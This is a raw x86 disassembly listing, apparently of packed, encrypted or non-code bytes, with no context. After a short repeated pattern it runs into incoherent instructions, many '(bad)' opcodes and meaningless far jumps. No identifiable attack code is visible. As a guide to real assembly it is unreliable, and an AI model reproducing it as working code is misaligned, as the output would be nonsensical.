  423368:	mov    ds:0xd76f6ed8,eax
  42336d:	fcomp  QWORD PTR [eax-0x53908e2f]
  423373:	xchg   esp,ecx
  423375:	mov    ds:0xd76f6ed8,eax
  42337a:	fcomp  QWORD PTR [eax-0x53908e2f]
  423380:	xchg   esp,ecx
  423382:	mov    ds:0xd76f6ed8,eax
  423387:	fcomp  QWORD PTR [eax-0x53908e2f]
  42338d:	xchg   esp,ecx
  42338f:	mov    ds:0xd76f6ed8,eax
  423394:	fcomp  QWORD PTR [eax-0x53908e2f]
  42339a:	xchg   esp,ecx
  42339c:	mov    ds:0xd76f6ed8,eax
  4233a1:	fcomp  QWORD PTR [eax-0x53908e2f]
  4233a7:	xchg   esp,ecx
  4233a9:	mov    ds:0xd76f6ed8,eax
  4233ae:	fcomp  QWORD PTR [eax-0x53908e2f]
  4233b4:	xchg   esp,ecx
  4233b6:	mov    ds:0xd76f6ed8,eax
  4233bb:	fcomp  QWORD PTR [eax-0x53908e2f]
  4233c1:	xchg   esp,ecx
  4233c3:	mov    ds:0xd76f6ed8,eax
  4233c8:	fcomp  QWORD PTR [eax-0x53908e2f]
  4233ce:	xchg   esp,ecx
  4233d0:	mov    ds:0x39286ed8,eax
  4233d5:	(bad)  
  4233d6:	cwde   
  4233d7:	(bad)  
  4233d8:	jno    0x423449
  4233da:	mov    esp,0x7a89cc87
  4233df:	mov    ah,0x1e
  4233e1:	mov    cl,0x23
  4233e3:	mov    ch,0x4f
  4233e5:	idiv   BYTE PTR [edi]
  4233e7:	inc    ecx
  4233e8:	mov    cl,0x24
  4233ea:	mov    al,0x6c
  4233ec:	sti    
  4233ed:	or     DWORD PTR [esi-0x3f3d3da8],esp
  4233f3:	fdivr  DWORD PTR [edx+0x592928ea]
  4233f9:	test   al,0x41
  4233fb:	mov    ch,0x4c
  4233fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233fe:	call   0x905f5445
  423403:	out    dx,al
  423404:	mov    ds:0x82e7c9ff,eax
  423409:	(bad)  
  42340a:	cmc    
  42340b:	js     0x423450
  42340d:	push   edx
  42340e:	jno    0x4233a3
  423410:	jge    0x4233d5
  423412:	enter  0x4935,0xc6
  423416:	xor    esi,ecx
  423418:	jo     0x423437
  42341a:	mov    BYTE PTR [esi],dl
  42341c:	stos   DWORD PTR es:[edi],eax
  42341d:	or     ebp,DWORD PTR [esi]
  42341f:	mov    WORD PTR [eax+0x111a759],ss
  423425:	rcl    ecx,cl
  423427:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423428:	test   al,0x10
  42342a:	mov    ch,0x9c
  42342c:	les    ebx,FWORD PTR [ebx]
  42342e:	jb     0x423496
  423430:	jb     0x423481
  423432:	dec    edx
  423433:	test   eax,0x858be628
  423438:	scas   al,BYTE PTR es:[edi]
  423439:	mov    ah,0xd4
  42343b:	in     eax,0xda
  42343d:	xchg   esp,eax
  42343e:	data16 aaa 
  423440:	xchg   BYTE PTR [edx-0x5a],dl
  423443:	loop   0x4233df
  423445:	adc    eax,0xb7aff01b
  42344a:	or     dl,bl
  42344c:	xchg   edx,eax
  42344d:	xchg   ebp,eax
  42344e:	lea    eax,[ebp+0x57]
  423451:	xchg   DWORD PTR [eax],esp
  423453:	add    BYTE PTR [ebp-0x31],al
  423456:	shl    DWORD PTR [edi],cl
  423458:	adc    ecx,DWORD PTR [edi+0x35]
  42345b:	lea    edi,[ebx-0xb]
  42345e:	out    dx,eax
  42345f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423460:	cmc    
  423461:	mov    ebp,0xc2b9f6bf
  423466:	cdq    
  423467:	dec    edi
  423468:	ds das 
  42346a:	dec    ebx
  42346b:	(bad)  
  42346c:	ja     0x4234a1
  42346e:	ins    BYTE PTR es:[edi],dx
  42346f:	xchg   DWORD PTR ds:0x5c815a16,ecx
  423475:	dec    ecx
  423476:	loop   0x4234a9
  423478:	neg    esi
  42347a:	cmp    al,0xad
  42347c:	rcl    BYTE PTR [edx-0x74],1
  42347f:	push   es
  423480:	mov    dl,0x43
  423482:	inc    esp
  423483:	sbb    eax,0x215e2370
  423488:	mov    DWORD PTR [ecx+ebx*2+0x5cb9c217],ebx
  42348f:	add    eax,0xe4427da8
  423494:	pop    esi
  423495:	not    BYTE PTR [ebp+0x49]
  423498:	sub    dl,BYTE PTR [ecx+0x7966d857]
  42349e:	dec    ecx
  42349f:	outs   dx,DWORD PTR ds:[esi]
  4234a0:	add    al,0x8
  4234a2:	mov    edx,0x42fe7271
  4234a7:	or     DWORD PTR [edx+0x20b59853],ebp
  4234ad:	shr    BYTE PTR [eax+0x1],0x7e
  4234b1:	xor    eax,0xa585e3c1
  4234b6:	cmp    eax,0x9a5caa3d
  4234bb:	mov    bh,cl
  4234bd:	jmp    0x4234db
  4234bf:	(bad)  
  4234c1:	or     dh,BYTE PTR [esi]
  4234c3:	inc    esp
  4234c4:	not    DWORD PTR [eax+ecx*1]
  4234c7:	adc    DWORD PTR [edx],ebp
  4234c9:	(bad)  
  4234ca:	fisttp QWORD PTR [eax+eiz*2]
  4234cd:	fwait
  4234ce:	mov    dl,BYTE PTR [edx]
  4234d0:	cmp    al,0x17
  4234d2:	or     DWORD PTR [ebp-0x13],0xc90cf747
  4234d9:	mov    eax,ds:0xc45a5e9b
  4234de:	arpl   dx,ax
  4234e0:	push   ss
  4234e1:	xchg   ecx,eax
  4234e2:	mov    esi,0xf7702028
  4234e7:	(bad)  
  4234e9:	xchg   esi,ebp
  4234eb:	jnp    0x423506
  4234ed:	out    0x32,al
  4234ef:	dec    ecx
  4234f0:	inc    edx
  4234f1:	inc    ebp
  4234f2:	xchg   DWORD PTR [ecx+0x789e4fa3],ebx
  4234f8:	aas    
  4234f9:	imul   ebx,edi,0x936c181e
  4234ff:	and    DWORD PTR [ecx-0x4],eax
  423502:	add    dl,BYTE PTR [ebx+0x759ec89e]
  423508:	dec    esi
  423509:	and    DWORD PTR [ebx],ebp
  42350b:	cmp    eax,0xdb7de52f
  423510:	mov    es,WORD PTR [ebx-0x26]
  423513:	mov    bh,0xb9
  423515:	dec    ecx
  423516:	cmp    DWORD PTR [edi],esi
  423518:	call   0x3d31:0xd64e1f21
  42351f:	add    eax,0xd4ad3cef
  423524:	push   edx
  423525:	jp     0x4234b9
  423527:	jno    0x4235a0
  423529:	adc    eax,0x74e7b9e4
  42352e:	xor    ebp,ebx
  423530:	jle    0x4234d1
  423532:	shl    DWORD PTR [eax],1
  423534:	cmc    
  423535:	sub    dl,BYTE PTR [eax]
  423537:	adc    eax,0x3d2441f9
  42353c:	xchg   ebp,eax
  42353d:	cmp    eax,0x5485d78e
  423542:	mul    DWORD PTR [edx-0x16]
  423545:	and    DWORD PTR [edi+0x44ae9335],0x7d
  42354c:	sahf   
  42354d:	inc    edx
  42354e:	inc    ebx
  42354f:	and    esi,DWORD PTR [edi]
  423551:	sub    BYTE PTR [esi-0x43070674],0x86
  423558:	hlt    
  423559:	push   ebx
  42355a:	fnstsw WORD PTR [edi+0x25db30b4]
  423560:	enter  0xbfba,0xbc
  423564:	and    eax,0x69ab5fc
  423569:	out    0xf8,al
  42356b:	mov    ch,0x3d
  42356d:	cmp    BYTE PTR [eax],bh
  42356f:	adc    eax,0x9fa75fc4
  423574:	mov    cl,0x6b
  423576:	popa   
  423577:	int3   
  423578:	xchg   edx,eax
  423579:	scas   al,BYTE PTR es:[edi]
  42357a:	adc    DWORD PTR [eax],edx
  42357c:	test   bh,bl
  42357e:	jo     0x4235d8
  423580:	jmp    0x162:0x668d6630
  423587:	jne    0x423559
  423589:	dec    ecx
  42358a:	or     edx,DWORD PTR [edi]
  42358c:	adc    eax,0x6ddcfb08
  423591:	push   cs
  423592:	fild   WORD PTR ds:0x4c3a3586
  423598:	sub    DWORD PTR [edi+0x3eac694d],esi
  42359e:	and    eax,0x2962c8c2
  4235a3:	call   0x74282917
  4235a8:	xor    eax,esi
  4235aa:	adc    BYTE PTR [ebx+esi*8],cl
  4235ad:	push   edx
  4235ae:	sahf   
  4235af:	jo     0x423536
  4235b1:	push   es
  4235b2:	shl    DWORD PTR [ecx-0x29],1
  4235b5:	ss ret 0x24e6
  4235b9:	sub    eax,0x650f58dd
  4235be:	lods   eax,DWORD PTR ds:[esi]
  4235bf:	int3   
  4235c0:	test   eax,0x9b24838f
  4235c5:	jmp    0x423633
  4235c7:	fs aam 0x10
  4235ca:	mov    ds:0x9209cac,eax
  4235cf:	ret    0x10b0
  4235d2:	es push ebx
  4235d4:	addr16 jo 0x4235b1
  4235d7:	call   FWORD PTR [edx+0x4e]
  4235da:	add    dl,bl
  4235dc:	retf   
  4235dd:	sbb    al,0x8f
  4235df:	jmp    0x364b:0x6c04bb6a
  4235e6:	sahf   
  4235e7:	sbb    eax,DWORD PTR [esi]
  4235e9:	jb     0x42360a
  4235eb:	add    al,0xcf
  4235ed:	pop    esp
  4235ee:	nop
  4235ef:	arpl   WORD PTR [ebp+eiz*8+0x7c],sp
  4235f3:	jns    0x423576
  4235f5:	add    eax,0x600d6c
  4235fa:	addr16 in al,dx
  4235fc:	dec    eax
  4235fd:	dec    esp
  4235fe:	cmp    eax,0x37ac303
  423603:	stos   BYTE PTR es:[edi],al
  423604:	xchg   ebp,eax
  423605:	into   
  423606:	fwait
  423607:	je     0x4235e1
  423609:	push   ss
  42360a:	jmp    0x1e60:0x319e5a8b
  423611:	inc    esi
  423612:	sahf   
  423613:	ror    BYTE PTR [esi],0x3
  423616:	or     bl,ch
  423618:	add    al,0x21
  42361a:	test   ah,al
  42361c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42361d:	int3   
  42361e:	push   0x21c082dc
  423623:	inc    edi
  423624:	pop    ebp
  423625:	stos   DWORD PTR es:[edi],eax
  423626:	outs   dx,BYTE PTR ds:[esi]
  423627:	into   
  423628:	arpl   WORD PTR [edx+0x2c14df51],si
  42362e:	pop    ds
  42362f:	cmp    eax,0xdeeda865
  423634:	in     eax,0xb
  423636:	fidiv  WORD PTR [ecx+ebp*4]
  423639:	gs bswap ecx
  42363c:	push   DWORD PTR [eax]
  42363e:	adc    eax,0x52d11e11
  423643:	push   edx
  423644:	adc    eax,0x8f0c7975
  423649:	add    al,0x6f
  42364b:	sar    BYTE PTR [ecx],cl
  42364d:	mov    ds:0xef45f7e4,al
  423652:	mov    dl,0x7f
  423654:	mov    eax,ds:0x974f84e2
  423659:	lock data16 cmc 
  42365c:	test   BYTE PTR [edi+edi*1],dl
  42365f:	rol    DWORD PTR [eax],1
  423661:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423662:	sbb    esi,esi
  423664:	clc    
  423665:	mov    esp,edi
  423667:	loope  0x4236b7
  423669:	push   ebx
  42366a:	inc    esi
  42366b:	sub    eax,0x25e00d27
  423670:	mov    dl,0x89
  423672:	neg    BYTE PTR [ecx-0x4e]
  423675:	jge    0x4236ce
  423677:	test   eax,0x1737c439
  42367c:	lods   eax,DWORD PTR ds:[esi]
  42367d:	mul    BYTE PTR [edx]
  42367f:	arpl   WORD PTR [esi],si
  423681:	daa    
  423682:	pcmpeqw mm3,QWORD PTR [ebx-0x3d]
  423686:	mov    edi,0xc3cf2a3c
  42368b:	mov    esp,0x3d707716
  423690:	sbb    BYTE PTR [esi+0x34],dh
  423693:	dec    ebp
  423694:	jne    0x423670
  423696:	pop    edx
  423697:	out    0x1a,eax
  423699:	jb     0x4236d9
  42369b:	les    edi,FWORD PTR [edx+0xbe50f84]
  4236a1:	add    ebp,DWORD PTR [ebp-0x6b]
  4236a4:	inc    ebp
  4236a5:	pusha  
  4236a6:	iret   
  4236a7:	addr16 sub bh,bh
  4236aa:	ins    BYTE PTR es:[edi],dx
  4236ab:	rcl    DWORD PTR [edx-0x25a934af],cl
  4236b1:	das    
  4236b2:	mov    bh,0x25
  4236b4:	cmp    ebp,DWORD PTR [edi+edx*2+0x7f2e7303]
  4236bb:	pusha  
  4236bc:	mov    esp,0xdb5c9a3d
  4236c1:	sbb    ebp,DWORD PTR [edi+0x7f]
  4236c4:	out    0x81,al
  4236c6:	nop
  4236c7:	adc    BYTE PTR [esp+eax*1-0x2bc2bec6],ah
  4236ce:	xchg   esi,eax
  4236cf:	mov    dh,0x81
  4236d1:	inc    esp
  4236d2:	pushf  
  4236d3:	ja     0x42372c
  4236d5:	jecxz  0x42373a
  4236d7:	jbe    0x4236ee
  4236d9:	add    ch,BYTE PTR [esi]
  4236db:	mov    edx,0xe0375725
  4236e0:	mov    ebp,0xac5095e5
  4236e5:	ins    DWORD PTR es:[edi],dx
  4236e6:	mov    esp,0x38230091
  4236eb:	pop    es
  4236ec:	ss je  0x42366f
  4236ef:	sbb    ch,BYTE PTR [edx-0x51bcc7a1]
  4236f5:	jnp    0x4236e4
  4236f7:	dec    edi
  4236f8:	cs pop ss
  4236fa:	outs   dx,BYTE PTR ds:[esi]
  4236fb:	es ffreep st(5)
  4236fe:	jno    0x423703
  423700:	das    
  423701:	mov    edi,DWORD PTR [edi]
  423703:	or     esp,DWORD PTR [esi+0x32]
  423706:	inc    ecx
  423707:	icebp  
  423708:	add    BYTE PTR es:[edx+0x71b5d3e9],bl
  42370f:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  423711:	clc    
  423712:	retf   
  423713:	mul    DWORD PTR [edi]
  423715:	addr16 sahf 
  423717:	jns    0x423717
  423719:	cdq    
  42371a:	hlt    
  42371b:	mov    eax,ds:0x40e9b02b
  423720:	mov    al,ds:0x12b8a935
  423725:	mov    al,0x3c
  423727:	or     eax,0x3bbd5b0
  42372c:	xchg   ebp,eax
  42372d:	xchg   edi,eax
  42372e:	les    ecx,FWORD PTR [ebx+edx*2-0x7c]
  423732:	cmp    al,0x71
  423734:	cmp    ebx,DWORD PTR [edx-0x1d68dbfd]
  42373a:	cmp    esp,0x60300a07
  423740:	jns    0x42375d
  423742:	scas   eax,DWORD PTR es:[edi]
  423743:	fnstcw WORD PTR [ebp+0x62]
  423746:	shl    ah,1
  423748:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423749:	jns    0x423790
  42374b:	lahf   
  42374c:	xor    BYTE PTR [ecx-0x4c],bl
  42374f:	add    eax,0x8ba41007
  423754:	retf   
  423755:	mov    dh,0x24
  423757:	stc    
  423758:	jge    0x4237ad
  42375a:	es jno 0x42379e
  42375d:	xchg   ecx,eax
  42375e:	nop
  42375f:	add    DWORD PTR [ebx+0x2f],ecx
  423762:	cmp    al,0x4e
  423764:	lds    edx,FWORD PTR [ecx]
  423766:	(bad)  
  423767:	mov    cl,0x46
  423769:	test   al,0xca
  42376b:	jmp    0x86c24444
  423770:	pop    esp
  423771:	(bad)  
  423772:	fcomip st,st(1)
  423774:	add    DWORD PTR [eax-0x30],edx
  423777:	(bad)  
  423778:	dec    ebx
  423779:	fmul   DWORD PTR [ebx-0x57d96636]
  42377f:	shl    BYTE PTR [edi+0x15606a23],1
  423785:	(bad)  
  423786:	outs   dx,DWORD PTR ds:[esi]
  423787:	xchg   ecx,eax
  423788:	push   esp
  423789:	aad    0x86
  42378b:	retf   0x5898
  42378e:	xor    BYTE PTR [ebp-0x74],bl
  423791:	xchg   ebp,eax
  423792:	add    DWORD PTR [edi+0x4d],ebx
  423795:	sti    
  423796:	(bad)  
  423797:	cld    
  423798:	push   ebp
  423799:	sub    edi,DWORD PTR [edx+eiz*1+0x3254d7a3]
  4237a0:	adc    DWORD PTR [ebx+0x6d8e2394],eax
  4237a6:	jmp    0x78a9b497
  4237ab:	in     al,dx
  4237ac:	pop    ss
  4237ad:	adc    ebp,eax
  4237af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237b0:	or     edx,0x21d7d9d0
  4237b6:	add    BYTE PTR [edi-0x41],dl
  4237b9:	jmp    0x8e55cb52
  4237be:	pop    es
  4237bf:	ins    DWORD PTR es:[edi],dx
  4237c0:	jecxz  0x4237cd
  4237c2:	jno    0x423839
  4237c4:	test   eax,0xf6cc4f9a
  4237c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4237cb:	jmp    0x914c664b
  4237d0:	loop   0x423790
  4237d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237d3:	out    0x95,al
  4237d5:	fidivr WORD PTR [ebx+0x33]
  4237d8:	retf   
  4237d9:	outs   dx,BYTE PTR ds:[esi]
  4237da:	int    0x43
  4237dc:	retf   
  4237dd:	xor    esp,DWORD PTR [ecx+eiz*2]
  4237e0:	out    0x53,al
  4237e2:	imul   ebx,DWORD PTR [edx+0x1a],0x7e7a6e02
  4237e9:	pop    ecx
  4237ea:	push   esi
  4237eb:	adc    BYTE PTR [ecx+0x5],cl
  4237ee:	pop    ds
  4237ef:	out    0x64,eax
  4237f1:	inc    esi
  4237f2:	int    0xc8
  4237f4:	test   DWORD PTR [ebp+0x1],eax
  4237f7:	call   0x4e6af272
  4237fc:	xchg   DWORD PTR [ecx-0x2256d617],eax
  423802:	int    0x16
  423804:	nop
  423805:	cli    
  423806:	lods   eax,DWORD PTR ds:[esi]
  423807:	inc    ebp
  423808:	aam    0xec
  42380a:	push   0xf564e48a
  42380f:	(bad)  
  423810:	sub    al,0xf3
  423812:	push   cs
  423813:	push   esp
  423814:	sar    BYTE PTR [edx+0x49cc449c],0xba
  42381b:	adc    ebx,DWORD PTR [esi+0x28]
  42381e:	shl    ebx,1
  423820:	jmp    0x9c19a261
  423825:	lea    edx,[edx]
  423827:	mov    cl,0xd6
  423829:	stc    
  42382a:	sub    ch,BYTE PTR [edi+0x13477037]
  423830:	(bad)  
  423831:	call   0xc8f6:0xda482b2c
  423838:	push   ds
  423839:	cmp    DWORD PTR ds:0xd5ca8375,ebx
  42383f:	and    ebx,eax
  423841:	sbb    ch,ah
  423843:	mov    ecx,0xde3c7419
  423848:	popa   
  423849:	fisubr DWORD PTR [esi+0x37]
  42384c:	push   edi
  42384d:	pop    edx
  42384e:	(bad)  
  42384f:	jo     0x423829
  423851:	xor    al,0x83
  423853:	dec    BYTE PTR [ebx-0x4e8a8d64]
  423859:	mov    edx,0x591aaf01
  42385e:	rcl    bh,cl
  423860:	and    DWORD PTR [esi-0x6f],0xffffffb4
  423864:	icebp  
  423865:	jnp    0x42382e
  423867:	push   ecx
  423868:	adc    bh,al
  42386a:	mov    ebx,0xcdd01372
  42386f:	and    BYTE PTR [esi+0x4e],0xf1
  423873:	je     0x42380e
  423875:	pop    ecx
  423876:	dec    dx
  423878:	jecxz  0x423852
  42387a:	sbb    al,al
  42387c:	clc    
  42387d:	out    0x12,al
  42387f:	xor    edx,DWORD PTR [edi]
  423881:	push   0x1f
  423883:	add    bh,BYTE PTR [esi]
  423885:	jmp    0xda19:0x6f73cd90
  42388c:	lods   al,BYTE PTR ds:[esi]
  42388d:	push   ebp
  42388e:	pop    eax
  42388f:	jmp    0x8031:0xaf5f949e
  423896:	xlat   BYTE PTR ds:[ebx]
  423897:	inc    esp
  423898:	adc    al,0x41
  42389a:	mov    ds:0x3991ad72,al
  42389f:	jno    0x423881
  4238a1:	xchg   ecx,eax
  4238a2:	loopne 0x42389e
  4238a4:	push   edi
  4238a5:	popf   
  4238a6:	jg     0x42390e
  4238a8:	sti    
  4238a9:	sub    BYTE PTR [esi-0x2ca2b0e],ah
  4238af:	fisttp DWORD PTR [ecx+0x3]
  4238b2:	cli    
  4238b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4238b4:	cmovbe esi,ebx
  4238b7:	push   esp
  4238b8:	lea    edx,fs:[ebp+0x52c1b6f3]
  4238bf:	ret    0x417e
  4238c2:	and    ch,BYTE PTR [ecx+0x1d]
  4238c5:	cmp    al,BYTE PTR [ebx]
  4238c7:	stc    
  4238c8:	fs pop ds
  4238ca:	jmp    0x1611:0x7ea23b5a
  4238d1:	push   esi
  4238d2:	hlt    
  4238d3:	adc    DWORD PTR [edx-0x2c248899],edi
  4238d9:	pop    ds
  4238da:	and    eax,0x4bad7f60
  4238df:	je     0x42393e
  4238e1:	push   ebx
  4238e2:	or     eax,0x14b3f794
  4238e7:	mov    esi,ds
  4238e9:	out    0x72,eax
  4238eb:	inc    ecx
  4238ec:	aam    0x6c
  4238ee:	mov    WORD PTR [esi],fs
  4238f0:	and    BYTE PTR [edx],0x70
  4238f3:	and    eax,ecx
  4238f5:	lods   eax,DWORD PTR ds:[esi]
  4238f6:	xchg   edx,eax
  4238f7:	and    eax,0xc4407131
  4238fc:	lea    esi,[edx+ecx*4+0x5f]
  423900:	sub    al,0xa7
  423902:	xchg   ecx,eax
  423903:	sub    BYTE PTR [eax+0x4f],bl
  423906:	lods   eax,DWORD PTR ds:[esi]
  423907:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423908:	into   
  423909:	sbb    al,0x5
  42390b:	cdq    
  42390c:	jl     0x4238c5
  42390e:	iret   
  42390f:	lods   eax,DWORD PTR ds:[esi]
  423910:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423911:	dec    esi
  423912:	xor    ebx,esi
  423914:	sbb    al,0x7f
  423916:	out    dx,eax
  423917:	add    DWORD PTR [ebx+0x4a],0xfffffffe
  42391b:	stc    
  42391c:	icebp  
  42391d:	xchg   ebx,eax
  42391e:	xlat   BYTE PTR ds:[ebx]
  42391f:	inc    ecx
  423920:	ror    edx,0x3
  423923:	aas    
  423924:	jge    0x4238b7
  423926:	add    BYTE PTR [esi+0x79],bl
  423929:	pop    ds
  42392a:	nop
  42392b:	mov    esp,0x29453ff3
  423930:	cmp    al,0x4b
  423932:	mov    ch,0xcd
  423934:	lods   eax,DWORD PTR ds:[esi]
  423935:	mov    ch,0x28
  423937:	imul   edx,DWORD PTR [edi],0x8c39c26d
  42393d:	imul   edx,DWORD PTR [ebx+eax*4+0x75],0x6c
  423942:	(bad)  
  423943:	sar    DWORD PTR [esi],cl
  423945:	inc    eax
  423946:	lods   eax,DWORD PTR ds:[esi]
  423947:	xchg   esp,eax
  423948:	je     0x423971
  42394a:	inc    edx
  42394b:	jl     0x4238ce
  42394d:	mov    ch,0x93
  42394f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423950:	pop    edx
  423951:	jb     0x423923
  423953:	and    dh,BYTE PTR [esi-0x14]
  423956:	sub    al,0x2c
  423958:	inc    ebx
  423959:	imul   edx,DWORD PTR [edi+esi*8-0x42],0x12afe826
  423961:	ror    DWORD PTR [edi],cl
  423963:	push   ss
  423964:	inc    eax
  423965:	mov    al,0x69
  423967:	pop    esp
  423968:	jg     0x4239ad
  42396a:	sub    ebp,edi
  42396c:	add    bh,BYTE PTR [ebx]
  42396e:	inc    ebx
  42396f:	xor    DWORD PTR ds:0x23b1449f,ebx
  423975:	rcr    BYTE PTR [ebx-0x65],cl
  423978:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423979:	aaa    
  42397a:	aaa    
  42397b:	dec    ebx
  42397c:	ins    BYTE PTR es:[edi],dx
  42397d:	retf   0xe9e9
  423980:	mov    ds:0xd6bb59d7,al
  423985:	repz push ds
  423987:	cmp    bl,BYTE PTR [edi+0x2c0cb406]
  42398d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42398e:	cmp    al,0x1
  423990:	dec    ebp
  423991:	adc    eax,0x1e5a84ca
  423996:	ja     0x4239e0
  423998:	and    eax,0xa1fe192f
  42399d:	in     al,dx
  42399e:	mov    DWORD PTR [esi-0x4aca966],ebx
  4239a4:	mov    al,0xf2
  4239a6:	or     WORD PTR [edx-0x4e],0xd408
  4239ac:	jmp    0x5106a2c5
  4239b1:	and    BYTE PTR [esi-0x6137ac44],bl
  4239b7:	pop    ds
  4239b8:	dec    ebx
  4239b9:	pop    ds
  4239ba:	jecxz  0x423950
  4239bc:	pop    eax
  4239bd:	in     al,dx
  4239be:	xchg   edx,eax
  4239bf:	fistp  QWORD PTR [ebp+0x73]
  4239c2:	div    BYTE PTR [eax]
  4239c4:	push   ds
  4239c5:	std    
  4239c6:	adc    eax,0x5ed47f99
  4239cb:	arpl   WORD PTR [edi+0xf],ax
  4239ce:	in     eax,dx
  4239cf:	pusha  
  4239d0:	sbb    BYTE PTR [ebx+eiz*4+0x68686bf0],dh
  4239d7:	mov    WORD PTR [ebp+0x1623bac7],cs
  4239dd:	inc    esp
  4239de:	lds    edi,FWORD PTR [ecx+0x77]
  4239e1:	inc    ebp
  4239e2:	or     edx,DWORD PTR [ebx+0x4bd512f0]
  4239e8:	and    ch,bl
  4239ea:	push   0x8417c85c
  4239ef:	mov    esi,0x25af112b
  4239f4:	cmp    edx,DWORD PTR [esi-0x4c]
  4239f7:	adc    DWORD PTR [ecx-0x645197d3],ebp
  4239fd:	(bad)  
  4239fe:	jl     0x423a00
  423a00:	jecxz  0x42398c
  423a02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a03:	mov    ebp,0x11209899
  423a08:	pop    ebp
  423a09:	shr    DWORD PTR [ebx-0x77339e4c],1
  423a0f:	push   esi
  423a10:	ret    0xcff0
  423a13:	(bad)  
  423a15:	lock iret 
  423a17:	pop    ds
  423a18:	mov    edx,0x6efffbdf
  423a1d:	cmp    edx,esi
  423a1f:	ret    0xa116
  423a22:	mov    edi,0x15a0b0a0
  423a27:	dec    esp
  423a28:	cmp    esi,eax
  423a2a:	(bad)  
  423a2b:	mov    bh,bh
  423a2d:	imul   ebx,DWORD PTR [ebx],0x12
  423a30:	jbe    0x423a35
  423a32:	call   0x21d2:0x83189b13
  423a39:	icebp  
  423a3a:	ins    DWORD PTR es:[edi],dx
  423a3b:	mov    ebp,0x4de0b7b9
  423a40:	cmp    BYTE PTR [ebx+ecx*4],0x9d
  423a44:	mov    edi,DWORD PTR [edx]
  423a46:	ficomp DWORD PTR [ebp+0x5c879ead]
  423a4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a4d:	lods   eax,DWORD PTR ds:[esi]
  423a4e:	xor    BYTE PTR [esi+0x2c856f04],ch
  423a54:	xchg   ebx,eax
  423a55:	mov    ch,0xee
  423a57:	test   BYTE PTR [ecx],bl
  423a59:	xor    esi,DWORD PTR [ebx+eiz*4+0x4911f70d]
  423a60:	xor    DWORD PTR [ebp-0x66cacf82],edx
  423a66:	push   cs
  423a67:	lock cmp ecx,DWORD PTR [esi-0x5e085e3d]
  423a6e:	xor    DWORD PTR [ebx+0x19ef999b],ecx
  423a74:	ds rcl eax,1
  423a77:	inc    edx
  423a78:	xchg   esi,eax
  423a79:	xchg   esp,eax
  423a7a:	and    ah,BYTE PTR [esi+0x265d2ff2]
  423a80:	jo     0x423acc
  423a82:	sbb    eax,0xb8098d76
  423a87:	daa    
  423a88:	push   edi
  423a89:	cld    
  423a8a:	stos   BYTE PTR es:[edi],al
  423a8b:	arpl   WORD PTR [edi-0x3456054e],sp
  423a91:	bswap  edx
  423a93:	frstor [esi+0xe3bcc4d]
  423a99:	or     BYTE PTR [eax-0x48e0573a],0xab
  423aa0:	cmp    BYTE PTR [ecx],dl
  423aa2:	mov    al,0x1c
  423aa4:	mov    ?,WORD PTR [ecx+0x1afd9e9d]
  423aaa:	cmp    esi,DWORD PTR [ecx]
  423aac:	mul    edi
  423aae:	retf   
  423aaf:	jle    0x423afa
  423ab1:	js     0x423af9
  423ab3:	mov    ebx,0x2ee2b96e
  423ab8:	loop   0x423a71
  423aba:	mov    edx,0x38f1c346
  423abf:	outs   dx,DWORD PTR ds:[esi]
  423ac0:	mov    bl,0xd0
  423ac2:	push   0x430a4365
  423ac7:	ret    0xc912
  423aca:	push   eax
  423acb:	iret   
  423acc:	inc    ecx
  423acd:	in     eax,0x10
  423acf:	or     bl,dh
  423ad1:	xor    DWORD PTR [ecx],ebp
  423ad3:	push   edx
  423ad4:	xlat   BYTE PTR ds:[ebx]
  423ad5:	test   al,0x20
  423ad7:	push   edx
  423ad8:	xchg   BYTE PTR [esi+0x5f9f953a],bl
  423ade:	aaa    
  423adf:	sub    dl,BYTE PTR [edi+0x49801fc8]
  423ae5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ae6:	daa    
  423ae7:	mov    ?,WORD PTR [edx]
  423ae9:	push   eax
  423aea:	and    DWORD PTR [edx+eiz*2-0x21a97897],ebp
  423af1:	imul   ecx,DWORD PTR [esi],0xe12d53b
  423af7:	and    eax,esp
  423af9:	mov    edx,0x8081ddd9
  423afe:	ret    
  423aff:	mov    BYTE PTR [edi],al
  423b01:	mov    edi,0x9232c6dd
  423b06:	xlat   BYTE PTR ds:[ebx]
  423b07:	mov    ds:0xcfebd3ef,al
  423b0c:	inc    ebp
  423b0d:	mov    esp,0x8311e4ae
  423b12:	xchg   ebx,eax
  423b13:	das    
  423b14:	dec    esp
  423b15:	fcomp  DWORD PTR [eax]
  423b17:	mov    ds:0xd451c543,al
  423b1c:	dec    edx
  423b1d:	lahf   
  423b1e:	loop   0x423af9
  423b20:	imul   esp,DWORD PTR [esi-0x6adaacf2],0xc86abbc5
  423b2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b2b:	mov    al,0x46
  423b2d:	ds pusha 
  423b2f:	jge    0x423adc
  423b31:	shl    DWORD PTR [ecx+0x43],cl
  423b34:	xor    DWORD PTR [esi],0xcb9a6f09
  423b3a:	adc    BYTE PTR [edx],0x54
  423b3d:	pop    esi
  423b3e:	mov    ch,0x44
  423b40:	jecxz  0x423b76
  423b42:	xor    DWORD PTR [eax+0x59f0113],edi
  423b48:	push   ss
  423b49:	and    edi,esp
  423b4b:	sbb    bl,BYTE PTR [edx+esi*2-0x3a]
  423b4f:	in     al,0xf4
  423b51:	icebp  
